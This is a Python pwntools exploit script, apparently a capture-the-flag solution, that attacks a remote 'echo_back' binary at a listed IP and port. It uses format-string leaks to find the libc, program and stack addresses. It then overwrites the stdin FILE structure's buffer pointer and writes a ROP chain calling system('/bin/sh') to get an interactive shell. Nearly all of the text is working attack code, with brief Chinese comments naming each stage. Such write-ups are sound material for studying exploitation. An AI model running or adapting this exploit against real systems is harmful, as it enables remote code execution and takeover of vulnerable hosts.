#! /usr/bin/env python
#coding:utf8
from pwn import *

local = 0
if local:
    p = process('./echo_back')
else:
    p = remote("111.200.241.244", 50905)

debug = 1
if debug:
    context.log_level = 'debug'

elf = ELF('./echo_back')
libc = ELF('./libc.so.6')
prdi = 0x0000000000000d93
main_P_addr = 0xc6c
IO_stdin = libc.symbols['_IO_2_1_stdin_']
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)

def echo_back(size, con):
    p.sendlineafter('choice>> ', '2')
    p.sendlineafter('length:', str(size))
    p.send(con)

def name(name):
    p.sendlineafter('choice>> ', '1')
    p.sendafter('name:', name)

# 泄露libc基址
echo_back(7, '%19$p')
p.recvuntil('0x')
libc_s_m_addr = int(p.recvuntil('-').split('-')[0], 16) - 240
print hex(libc_s_m_addr)

offset = libc_s_m_addr - libc.symbols['__libc_start_main']
system = libc.symbols['system'] + offset
bin_sh = libc.search('/bin/sh').next() + offset
IO_stdin_addr = IO_stdin + offset
print hex(offset)
# 泄露elf基址
echo_back(7, '%13$p')
p.recvuntil('0x')
elf_base = int(p.recvuntil('-', drop=True), 16) - 0xd08
prdi = prdi + elf_base
# 泄露main返回地址
echo_back(7, '%12$p')
p.recvuntil('0x')
main_ebp = int(p.recvuntil('-', drop=True), 16)
main_ret = main_ebp + 0x8
# 修改IO_buf_base，增大输入字符数
IO_buf_base = IO_stdin_addr + 0x8 * 7
print "IO_buf_base:"+hex(IO_buf_base)
name(p64(IO_buf_base))
echo_back(7, '%16$hhn')
# 输入payload，覆盖stdinFILE结构的关键参数
payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)
p.sendlineafter('choice>> ', '2')
p.sendafter('length:', payload)
p.sendline('')
# 绕过_IO_new_file_underflow中检测
for i in range(0,len(payload) - 1):
    p.sendlineafter('choice>> ', '2')
    p.sendlineafter('length:', '0')
# 实现指定位置写
p.sendlineafter('choice>> ', '2')
p.sendlineafter('length:', p64(prdi) + p64(bin_sh) + p64(system))
p.sendline('')
# getshell
p.sendlineafter('choice>> ', '3')
p.interactive()


